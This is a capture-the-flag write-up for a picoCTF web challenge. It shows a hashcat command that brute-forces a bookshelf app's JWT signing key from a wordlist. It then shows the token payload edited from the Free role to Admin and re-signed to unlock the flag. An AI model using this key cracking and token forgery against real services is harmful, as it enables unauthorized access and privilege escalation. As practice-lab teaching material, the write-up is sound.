# Challange Info

Name : Java Code Analysis!?!

Difficulty : Medium

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/355?category=1&page=1

# Writeup

The webapp provides you books and there are three tiers to access books Free, Premium, Admin the admin role is required to access the flag.

Checking storage of webapp and there is a JWT in local storage.

Trying to bruteforce the JWT key with hashcat.

```bash
hashcat -a 0 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTczNjM1NDcxMCwiaWF0IjoxNzM1NzQ5OTEwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.J-18zb26kd2vD_o8DTmkwryKFnY2CVZwA5qLe7iHfes /usr/share/wordlists/rockyou.txt
```

> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTczNjM1NDcxMCwiaWF0IjoxNzM1NzQ5OTEwLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.J-18zb26kd2vD_o8DTmkwryKFnY2CVZwA5qLe7iHfes:1234

This gives us the JWT signing key now we can generate our own JWT key.

Website Link : https://10015.io/tools/jwt-encoder-decoder

First let's decode the JWT And verify signature.

```
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1736355162,
  "iat": 1735750362,
  "userId": 1,
  "email": "user"
}
```

Entering the signature and it's verified let's copy payload and change some parameters.

```
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1736355162,
  "iat": 1735750362,
  "userId": 2,
  "email": "user"
}
```

Now sign the JWT with the key and edit it in Session storage of webapp.

For safety I also edit the token below JWT.

The book is now unlocked with the flag.
